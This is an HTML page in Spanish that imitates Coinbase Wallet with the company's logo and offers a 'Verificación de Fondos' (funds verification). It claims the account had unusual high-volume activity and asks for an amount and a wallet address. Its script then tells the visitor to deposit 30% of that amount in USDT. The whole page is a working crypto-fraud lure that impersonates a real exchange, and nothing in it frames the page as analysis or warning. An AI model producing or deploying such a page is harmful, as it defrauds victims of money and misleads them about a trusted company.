<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificaci贸n de Fondos - Coinbase Wallet</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex justify-center items-center min-h-screen">
    <div class="bg-white p-6 rounded-lg shadow-lg w-96">
        <img src="https://www.coinbase.com/favicon.ico" alt="Coinbase Logo" class="w-12 mx-auto">
        <h2 class="text-center text-2xl font-semibold my-4 text-blue-600">Verificaci贸n de Fondos</h2>
        <p class="text-gray-600 text-center mb-4">
            Debido a la reciente actividad de alto volumen en su cuenta, requerimos una verificaci贸n de fondos para garantizar la seguridad de sus activos.
        </p>

        <form id="verificationForm">
            <label class="block mb-2 text-sm font-semibold text-gray-700">Monto a verificar (USDT)</label>
            <input type="number" id="amountInput" class="w-full p-2 border rounded-lg mb-4" placeholder="Ingrese el monto" required>

            <label class="block mb-2 text-sm font-semibold text-gray-700">Direcci贸n de Wallet</label>
            <input type="text" class="w-full p-2 border rounded-lg mb-4" placeholder="0x..." required>

            <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded-lg hover:bg-blue-700 transition">
                Verificar Ahora
            </button>
        </form>

        <p id="depositAmount" class="text-gray-700 text-center mt-4 font-semibold hidden"></p>
    </div>

    <script>
        document.getElementById("verificationForm").addEventListener("submit", function(event) {
            event.preventDefault();
            let amount = parseFloat(document.getElementById("amountInput").value);
            if (!isNaN(amount) && amount > 0) {
                let deposit = amount * 0.30;
                document.getElementById("depositAmount").textContent = `El monto a depositar en su cuenta de Coinbase Wallet es: ${deposit.toFixed(2)} USDT`;
                document.getElementById("depositAmount").classList.remove("hidden");
            }
        });
    </script>
</body>
</html>
